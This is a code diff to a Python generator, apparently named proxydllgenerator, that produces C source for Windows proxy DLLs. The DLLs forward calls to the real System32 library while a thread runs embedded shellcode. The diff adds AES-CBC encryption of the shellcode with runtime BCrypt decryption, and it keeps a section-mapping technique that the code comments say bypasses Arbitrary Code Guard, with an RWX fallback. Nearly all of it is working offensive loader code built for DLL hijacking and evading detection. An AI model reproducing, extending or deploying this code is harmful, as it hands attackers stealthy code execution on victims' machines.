@@ -4,8 +4,10 @@ from __future__ import annotations
 
 import os
 import re
+from typing import Optional
 
 from .dll_parser import DllInfo, ExportEntry
+from .aes_crypto import EncryptParams
 
 _BYTES_PER_LINE = 12
 
@@ -18,12 +20,17 @@ def _format_shellcode(data: bytes) -> str:
     return ",\n".join(lines)
 
 
+def _format_key_iv(data: bytes) -> str:
+    """Format key or IV bytes as a single-line comma-separated hex literal."""
+    return ", ".join(f"0x{b:02x}" for b in data)
+
+
 def _is_valid_c_identifier(name: str) -> bool:
     return bool(re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", name))
 
 
 # ---------------------------------------------------------------------------
-# C source  (no inline asm – just DllMain + shellcode thread)
+# Plain C template  (no encryption)
 # ---------------------------------------------------------------------------
 
 _C_TEMPLATE = """\
@@ -53,12 +60,11 @@ static const unsigned char _sc[] = {{
 extern void *proxy_fns[];
 
 /*
- * exec_via_section – execute shellcode by mapping a section object.
- * Section-backed executable memory is not subject to ProcessDynamicCodePolicy
- * (ProhibitDynamicCode) the way VirtualAlloc PAGE_EXECUTE_READWRITE is.
- * Returns TRUE on success.
+ * _exec_via_section – copy shellcode into a section-backed RW view,
+ * unmap it, then map a separate RX view and execute.
+ * Section-backed executable memory bypasses ProcessDynamicCodePolicy (ACG).
  */
-static BOOL _exec_via_section(void)
+static BOOL _exec_via_section(const unsigned char *sc, SIZE_T sc_len)
 {{
     HMODULE hNt = GetModuleHandleA("ntdll.dll");
     if (!hNt) return FALSE;
@@ -77,7 +83,7 @@ static BOOL _exec_via_section(void)
         return FALSE;
 
     LARGE_INTEGER sz;
-    sz.QuadPart = (LONGLONG)sizeof(_sc);
+    sz.QuadPart = (LONGLONG)sc_len;
 
     HANDLE hSection = NULL;
     /* SEC_COMMIT | PAGE_EXECUTE_READWRITE */
@@ -86,21 +92,21 @@ static BOOL _exec_via_section(void)
     if (st != 0 || !hSection) return FALSE;
 
     /* Map a RW view to copy shellcode in */
-    PVOID  rwView  = NULL;
-    SIZE_T viewSz  = 0;
+    PVOID  rwView = NULL;
+    SIZE_T viewSz = 0;
     st = pNtMapViewOfSection(hSection, GetCurrentProcess(),
                              &rwView, 0, 0, NULL, &viewSz,
                              2 /* ViewUnmap */, 0, PAGE_READWRITE);
     if (st != 0) {{ pNtClose(hSection); return FALSE; }}
 
-    for (SIZE_T i = 0; i < sizeof(_sc); i++)
-        ((unsigned char *)rwView)[i] = _sc[i];
+    for (SIZE_T i = 0; i < sc_len; i++)
+        ((unsigned char *)rwView)[i] = sc[i];
 
     pNtUnmapViewOfSection(GetCurrentProcess(), rwView);
 
     /* Map a separate RX view to execute from */
-    PVOID  rxView  = NULL;
-    SIZE_T rxSz    = 0;
+    PVOID  rxView = NULL;
+    SIZE_T rxSz   = 0;
     st = pNtMapViewOfSection(hSection, GetCurrentProcess(),
                              &rxView, 0, 0, NULL, &rxSz,
                              2 /* ViewUnmap */, 0, PAGE_EXECUTE_READ);
@@ -120,20 +126,241 @@ static DWORD WINAPI _ScThread(LPVOID p)
     /* Primary path: section-mapped memory (bypasses ProhibitDynamicCode /
        ACG because the memory is backed by a section object, not a plain
        VirtualAlloc RWX region). */
-    if (_exec_via_section()) return 0;
+    if (_exec_via_section(_sc, sizeof(_sc))) return 0;
 
     /* Fallback: classic VirtualAlloc RWX for targets without ACG.
        If the policy is active, VirtualAlloc returns NULL and we exit
-       silently rather than crashing the host process.
-       Note: __try/__except is not available in MinGW GCC; targets that
-       raise STATUS_DYNAMIC_CODE_BLOCKED as a hard exception (not NULL
-       return) require the section path above instead. */
+       silently rather than crashing the host process. */
     LPVOID m = VirtualAlloc(NULL, sizeof(_sc),
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
     if (!m) return 1;
     for (SIZE_T i = 0; i < sizeof(_sc); i++)
         ((unsigned char *)m)[i] = _sc[i];
+    ((void (*)(void))m)();
+    VirtualFree(m, 0, MEM_RELEASE);
+    return 0;
+}}
+
+BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved)
+{{
+    (void)reserved;
+    if (reason == DLL_PROCESS_ATTACH) {{
+        DisableThreadLibraryCalls(h);
+
+        /* Load the real DLL by full System32 path to avoid recursively
+           loading our own proxy when it sits in a higher-priority directory. */
+        char _orig_path[MAX_PATH];
+        if (!GetSystemDirectoryA(_orig_path, MAX_PATH)) return FALSE;
+        lstrcatA(_orig_path, "\\\\{dll_basename}.dll");
+        HMODULE orig = LoadLibraryA(_orig_path);
+        if (!orig) return FALSE;
+
+{getproc_calls}
+
+        CloseHandle(CreateThread(NULL, 0, _ScThread, NULL, 0, NULL));
+    }}
+    return TRUE;
+}}
+"""
+
+
+# ---------------------------------------------------------------------------
+# Encrypted C template  (AES-CBC via Windows CNG / BCrypt)
+# ---------------------------------------------------------------------------
+
+_C_TEMPLATE_ENCRYPTED = """\
+/*
+ * Proxy DLL – auto-generated by proxydllgenerator
+ * Original : {dll_basename}.dll (System32) | Arch: {arch}
+ * Shellcode: AES-{key_bits}-CBC encrypted (runtime BCrypt decryption)
+ */
+#include <windows.h>
+#include <bcrypt.h>
+
+typedef NTSTATUS (NTAPI *_NtCreateSection_t)(
+    PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+typedef NTSTATUS (NTAPI *_NtMapViewOfSection_t)(
+    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
+    PSIZE_T, DWORD, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *_NtUnmapViewOfSection_t)(HANDLE, PVOID);
+typedef NTSTATUS (NTAPI *_NtClose_t)(HANDLE);
+
+/* AES-{key_bits}-CBC encrypted shellcode */
+static const unsigned char _sc[] = {{
+{shellcode_bytes}
+}};
+
+/* AES-{key_bits} key */
+static const unsigned char _sc_key[] = {{ {key_bytes} }};
+
+/* AES IV (128-bit) */
+static const unsigned char _sc_iv[]  = {{ {iv_bytes} }};
+
+/*
+ * proxy_fns – global pointer array defined in stubs.s.
+ * DllMain fills every slot; the asm stubs JMP through it.
+ */
+extern void *proxy_fns[];
+
+/*
+ * _decrypt_sc – AES-{key_bits}-CBC decrypt _sc using Windows CNG (BCrypt).
+ *
+ * Allocates a heap buffer for the plaintext; caller MUST call
+ * SecureZeroMemory then HeapFree on the returned pointer after use.
+ * Writes decrypted byte count to *out_len.  Returns NULL on failure.
+ */
+static unsigned char *_decrypt_sc(DWORD *out_len)
+{{
+    BCRYPT_ALG_HANDLE hAlg  = NULL;
+    BCRYPT_KEY_HANDLE hKey  = NULL;
+    unsigned char    *kObj  = NULL;
+    unsigned char    *plain = NULL;
+    DWORD             kObjLen, dummy;
+
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
+        return NULL;
+
+    /* Set CBC chaining mode */
+    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
+                          (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
+                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0)
+        goto fail_alg;
+
+    /* Query required key-object size and allocate */
+    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
+                          (PUCHAR)&kObjLen, sizeof(DWORD), &dummy, 0) != 0)
+        goto fail_alg;
+
+    kObj = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, kObjLen);
+    if (!kObj) goto fail_alg;
+
+    if (BCryptGenerateSymmetricKey(hAlg, &hKey,
+                                   kObj, kObjLen,
+                                   (PUCHAR)_sc_key, (ULONG)sizeof(_sc_key), 0) != 0)
+        goto fail_kobj;
+
+    /* Output buffer – same size as ciphertext (plaintext will be smaller) */
+    plain = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, sizeof(_sc));
+    if (!plain) goto fail_key;
+
+    /* BCrypt modifies the IV in-place; use a local copy */
+    unsigned char iv_tmp[16];
+    for (int _i = 0; _i < 16; _i++) iv_tmp[_i] = _sc_iv[_i];
+
+    *out_len = 0;
+    if (BCryptDecrypt(hKey,
+                      (PUCHAR)_sc,  (ULONG)sizeof(_sc), NULL,
+                      iv_tmp,        16,
+                      plain,         (ULONG)sizeof(_sc),
+                      out_len,       BCRYPT_BLOCK_PADDING) != 0)
+    {{
+        HeapFree(GetProcessHeap(), 0, plain);
+        plain = NULL;
+    }}
+
+fail_key:
+    BCryptDestroyKey(hKey);
+fail_kobj:
+    HeapFree(GetProcessHeap(), 0, kObj);
+fail_alg:
+    BCryptCloseAlgorithmProvider(hAlg, 0);
+    return plain;
+}}
+
+/*
+ * _exec_via_section – copy sc into a section-backed RW view,
+ * unmap it, then map a separate RX view and execute.
+ * Section-backed executable memory bypasses ProcessDynamicCodePolicy (ACG).
+ */
+static BOOL _exec_via_section(const unsigned char *sc, SIZE_T sc_len)
+{{
+    HMODULE hNt = GetModuleHandleA("ntdll.dll");
+    if (!hNt) return FALSE;
+
+    _NtCreateSection_t      pNtCreateSection      =
+        (_NtCreateSection_t)     GetProcAddress(hNt, "NtCreateSection");
+    _NtMapViewOfSection_t   pNtMapViewOfSection   =
+        (_NtMapViewOfSection_t)  GetProcAddress(hNt, "NtMapViewOfSection");
+    _NtUnmapViewOfSection_t pNtUnmapViewOfSection =
+        (_NtUnmapViewOfSection_t)GetProcAddress(hNt, "NtUnmapViewOfSection");
+    _NtClose_t              pNtClose              =
+        (_NtClose_t)             GetProcAddress(hNt, "NtClose");
+
+    if (!pNtCreateSection || !pNtMapViewOfSection ||
+        !pNtUnmapViewOfSection || !pNtClose)
+        return FALSE;
+
+    LARGE_INTEGER sz;
+    sz.QuadPart = (LONGLONG)sc_len;
+
+    HANDLE hSection = NULL;
+    /* SEC_COMMIT | PAGE_EXECUTE_READWRITE */
+    NTSTATUS st = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
+                                   &sz, PAGE_EXECUTE_READWRITE, 0x8000000, NULL);
+    if (st != 0 || !hSection) return FALSE;
+
+    /* Map a RW view to copy shellcode in */
+    PVOID  rwView = NULL;
+    SIZE_T viewSz = 0;
+    st = pNtMapViewOfSection(hSection, GetCurrentProcess(),
+                             &rwView, 0, 0, NULL, &viewSz,
+                             2 /* ViewUnmap */, 0, PAGE_READWRITE);
+    if (st != 0) {{ pNtClose(hSection); return FALSE; }}
+
+    for (SIZE_T i = 0; i < sc_len; i++)
+        ((unsigned char *)rwView)[i] = sc[i];
+
+    pNtUnmapViewOfSection(GetCurrentProcess(), rwView);
+
+    /* Map a separate RX view to execute from */
+    PVOID  rxView = NULL;
+    SIZE_T rxSz   = 0;
+    st = pNtMapViewOfSection(hSection, GetCurrentProcess(),
+                             &rxView, 0, 0, NULL, &rxSz,
+                             2 /* ViewUnmap */, 0, PAGE_EXECUTE_READ);
+    pNtClose(hSection);
+    if (st != 0) return FALSE;
+
+    ((void (*)(void))rxView)();
+    pNtUnmapViewOfSection(GetCurrentProcess(), rxView);
+    return TRUE;
+}}
+
+/* shellcode decryption and execution thread */
+static DWORD WINAPI _ScThread(LPVOID p)
+{{
+    (void)p;
+
+    /* Decrypt the embedded ciphertext */
+    DWORD plain_len = 0;
+    unsigned char *plain = _decrypt_sc(&plain_len);
+    if (!plain || plain_len == 0) return 1;
+
+    /* Primary path: section-mapped RX memory (bypasses ACG).
+     * The shellcode may never return; plain is zeroed if/when it does. */
+    if (_exec_via_section(plain, (SIZE_T)plain_len)) {{
+        SecureZeroMemory(plain, sizeof(_sc));
+        HeapFree(GetProcessHeap(), 0, plain);
+        return 0;
+    }}
+
+    /* Fallback: VirtualAlloc RWX.  Copy to executable region, then zero
+     * the heap plaintext immediately to minimise key-material exposure. */
+    LPVOID m = VirtualAlloc(NULL, (SIZE_T)plain_len,
+                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!m) {{
+        SecureZeroMemory(plain, sizeof(_sc));
+        HeapFree(GetProcessHeap(), 0, plain);
+        return 1;
+    }}
+    for (SIZE_T i = 0; i < (SIZE_T)plain_len; i++)
+        ((unsigned char *)m)[i] = plain[i];
+
+    /* Zero heap plaintext before executing */
+    SecureZeroMemory(plain, sizeof(_sc));
+    HeapFree(GetProcessHeap(), 0, plain);
+
     ((void (*)(void))m)();
     VirtualFree(m, 0, MEM_RELEASE);
     return 0;
@@ -220,22 +447,30 @@ def _sanitize(name: str, ordinal: int) -> str:
 
 
 def generate_proxy_source(
-    shellcode_path: str,
+    shellcode: bytes,
     dll_basename: str,
     arch: str,
     exports: list[ExportEntry],
+    encrypt_params: Optional[EncryptParams] = None,
 ) -> tuple[str, str, list[tuple[str, str, int]]]:
     """
     Generate C source and assembly stubs for the proxy DLL.
+
+    Args:
+        shellcode:       Raw shellcode bytes (plain), or already-encrypted
+                         bytes when encrypt_params is provided.
+        dll_basename:    DLL name without extension (e.g. ``"secur32"``).
+        arch:            ``"x64"`` or ``"x86"``.
+        exports:         Parsed export list from the original DLL.
+        encrypt_params:  If not None, generate the AES-CBC decryption template
+                         and embed key/IV in the source.
 
     Returns:
         (c_source, asm_source, valid_exports)
         valid_exports: list of (real_name, safe_asm_name, ordinal)
     """
-    with open(shellcode_path, "rb") as fh:
-        sc_data = fh.read()
-    if not sc_data:
-        raise ValueError(f"Shellcode file is empty: {shellcode_path}")
+    if not shellcode:
+        raise ValueError("Shellcode is empty")
 
     ptr_size   = 8 if arch == "x64" else 4
     asm_header = _ASM_HEADER_X64 if arch == "x64" else _ASM_HEADER_X86
@@ -243,7 +478,6 @@ def generate_proxy_source(
     ptr_decl   = ".quad 0" if arch == "x64" else ".long 0"
 
     valid_exports: list[tuple[str, str, int]] = []
-
     for exp in exports:
         if exp.name is None:
             continue
@@ -251,30 +485,40 @@ def generate_proxy_source(
         valid_exports.append((exp.name, safe, exp.ordinal))
 
     # ---- build assembly ----
-    ptr_slots  = "\n".join(
+    ptr_slots = "\n".join(
         f"    {ptr_decl}    /* [{i}] {real} */"
         for i, (real, safe, _) in enumerate(valid_exports)
     )
-
     asm_stubs = "".join(
         asm_stub.format(sym=safe, offset=i * ptr_size)
         for i, (_, safe, _) in enumerate(valid_exports)
     )
-
     asm_src = asm_header.format(ptr_slots=ptr_slots) + asm_stubs
 
-    # ---- build C source ----
+    # ---- build GetProcAddress calls ----
     getproc_calls = "\n".join(
         f'        proxy_fns[{i}] = (void *)GetProcAddress(orig, "{real}");'
         for i, (real, safe, _) in enumerate(valid_exports)
     )
 
-    c_src = _C_TEMPLATE.format(
-        dll_basename=dll_basename,
-        arch=arch,
-        shellcode_bytes=_format_shellcode(sc_data),
-        getproc_calls=getproc_calls,
-    )
+    # ---- build C source ----
+    if encrypt_params is not None:
+        c_src = _C_TEMPLATE_ENCRYPTED.format(
+            dll_basename=dll_basename,
+            arch=arch,
+            key_bits=encrypt_params.bits,
+            shellcode_bytes=_format_shellcode(shellcode),
+            key_bytes=_format_key_iv(encrypt_params.key),
+            iv_bytes=_format_key_iv(encrypt_params.iv),
+            getproc_calls=getproc_calls,
+        )
+    else:
+        c_src = _C_TEMPLATE.format(
+            dll_basename=dll_basename,
+            arch=arch,
+            shellcode_bytes=_format_shellcode(shellcode),
+            getproc_calls=getproc_calls,
+        )
 
     return c_src, asm_src, valid_exports
 
@@ -301,7 +545,6 @@ def generate_def_file(
         if real_name == safe_name:
             lines.append(f"    {safe_name} @{ordinal}")
         else:
-            # Map the asm symbol to the original export name
             lines.append(f"    {real_name}={safe_name} @{ordinal}")
     return "\n".join(lines) + "\n"
 
@@ -314,11 +557,17 @@ def write_build_files(
     build_dir: str,
     proxy_name: str,
     dll_info: DllInfo,
-    shellcode_path: str,
+    shellcode: bytes,
     arch: str,
+    encrypt_params: Optional[EncryptParams] = None,
 ) -> tuple[str, str, str, int]:
     """
     Write dllmain.c, stubs.s, and proxy.def into build_dir.
+
+    Args:
+        shellcode:      Raw or already-encrypted shellcode bytes.
+        encrypt_params: If not None, the generated C will embed key/IV and
+                        use Windows BCrypt to decrypt at runtime.
 
     Returns:
         (c_path, asm_path, def_path, skipped_count)
@@ -326,10 +575,11 @@ def write_build_files(
     os.makedirs(build_dir, exist_ok=True)
 
     c_src, asm_src, valid_exports = generate_proxy_source(
-        shellcode_path=shellcode_path,
+        shellcode=shellcode,
         dll_basename=dll_info.basename,
         arch=arch,
         exports=dll_info.exports,
+        encrypt_params=encrypt_params,
     )
 
     skipped = sum(1 for e in dll_info.exports if e.name is None)
